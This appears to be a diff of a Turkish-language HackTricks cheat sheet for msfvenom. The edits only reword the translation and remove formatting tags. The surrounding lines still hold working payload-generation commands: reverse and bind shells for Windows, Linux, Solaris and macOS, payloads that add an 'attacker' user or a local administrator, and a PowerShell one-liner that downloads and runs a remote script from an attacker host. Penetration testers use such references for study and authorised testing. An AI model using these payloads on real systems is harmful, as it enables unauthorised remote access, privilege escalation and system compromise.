@@ -9,7 +9,7 @@ GCP Hacking'i öğrenin ve pratik yapın: <img src="../../.gitbook/assets/grte.p
 <summary>HackTricks'i Destekleyin</summary>
 
 * [**abonelik planlarını**](https://github.com/sponsors/carlospolop) kontrol edin!
-* **💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katılın ya da **Twitter'da** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**'i takip edin.**
+* **Bize katılın** 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) veya **bizi** **Twitter'da** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks_live)** takip edin.**
 * **Hacking ipuçlarını paylaşmak için** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna PR gönderin.
 
 </details>
@@ -28,7 +28,7 @@ Gerçek zamanlı haberler ve içgörülerle hızlı tempolu hacking dünyasında
 **Son Duyurular**\
 Yeni başlayan bug bounty'ler ve önemli platform güncellemeleri hakkında bilgi sahibi olun
 
-**Bugün** [**Discord**](https://discord.com/invite/N3FrSbmwdy) üzerinden bize katılın ve en iyi hackerlarla işbirliği yapmaya başlayın!
+**Bize katılın** [**Discord**](https://discord.com/invite/N3FrSbmwdy) ve bugün en iyi hackerlarla işbirliği yapmaya başlayın!
 
 ***
 
@@ -36,14 +36,14 @@ Yeni başlayan bug bounty'ler ve önemli platform güncellemeleri hakkında bilg
 
 `msfvenom -p <PAYLOAD> -e <ENCODER> -f <FORMAT> -i <ENCODE COUNT> LHOST=<IP>`
 
-Ayrıca mimariyi belirtmek için `-a` veya `--platform` kullanılabilir.
+Mimariyi belirtmek için `-a` veya `--platform` kullanılabilir. 
 
 ## Listeleme
 ```bash
 msfvenom -l payloads #Payloads
 msfvenom -l encoders #Encoders
 ```
-## Shellcode oluştururken yaygın parametreler
+## Shellcode Oluştururken Yaygın Parametreler
 ```bash
 -b "\x00\x0a\x0d"
 -f c
@@ -75,16 +75,12 @@ msfvenom -p windows/meterpreter/bind_tcp RHOST=(IP Address) LPORT=(Your Port) -f
 ```bash
 msfvenom -p windows/adduser USER=attacker PASS=attacker@123 -f exe > adduser.exe
 ```
-{% endcode %}
-
 ### CMD Shell
 
 {% code overflow="wrap" %}
 ```bash
 msfvenom -p windows/shell/reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f exe > prompt.exe
 ```
-{% endcode %}
-
 ### **Komut Çalıştır**
 
 {% code overflow="wrap" %}
@@ -92,15 +88,13 @@ msfvenom -p windows/shell/reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f ex
 msfvenom -a x86 --platform Windows -p windows/exec CMD="powershell \"IEX(New-Object Net.webClient).downloadString('http://IP/nishang.ps1')\"" -f exe > pay.exe
 msfvenom -a x86 --platform Windows -p windows/exec CMD="net localgroup administrators shaun /add" -f exe > pay.exe
 ```
-{% endcode %}
-
 ### Kodlayıcı
 ```bash
 msfvenom -p windows/meterpreter/reverse_tcp -e shikata_ga_nai -i 3 -f exe > encoded.exe
 ```
 {% endcode %}
 
-### Çalıştırılabilir dosya içine gömülü
+### Çalıştırılabilir dosya içinde gömülü
 
 {% code overflow="wrap" %}
 ```bash
@@ -110,7 +104,7 @@ msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -x /usr/share/wind
 
 ## Linux Yükleri
 
-### Ters Shell
+### Ters Kabuk
 
 {% code overflow="wrap" %}
 ```bash
@@ -125,8 +119,6 @@ msfvenom -p linux/x64/shell_reverse_tcp LHOST=IP LPORT=PORT -f elf > shell.elf
 ```bash
 msfvenom -p linux/x86/meterpreter/bind_tcp RHOST=(IP Address) LPORT=(Your Port) -f elf > bind.elf
 ```
-{% endcode %}
-
 ### SunOS (Solaris)
 
 {% code overflow="wrap" %}
@@ -143,11 +135,7 @@ msfvenom --platform=solaris --payload=solaris/x86/shell_reverse_tcp LHOST=(ATTAC
 ```bash
 msfvenom -p osx/x86/shell_reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f macho > reverse.macho
 ```
-{% endcode %}
-
 ### **Bind Shell**
-
-{% code overflow="wrap" %}
 ```bash
 msfvenom -p osx/x86/shell_bind_tcp RHOST=(IP Address) LPORT=(Your Port) -f macho > bind.macho
 ```
@@ -234,7 +222,7 @@ Gerçek zamanlı haberler ve içgörülerle hızlı tempolu hacking dünyasında
 **Son Duyurular**\
 Yeni başlayan bug bounty'ler ve önemli platform güncellemeleri hakkında bilgi sahibi olun
 
-**Bugün en iyi hackerlarla işbirliği yapmak için** [**Discord**](https://discord.com/invite/N3FrSbmwdy) sunucumuza katılın!
+**Bize katılın** [**Discord**](https://discord.com/invite/N3FrSbmwdy) ve bugün en iyi hackerlarla işbirliği yapmaya başlayın!
 
 {% hint style="success" %}
 AWS Hacking'i öğrenin ve pratik yapın:<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">\
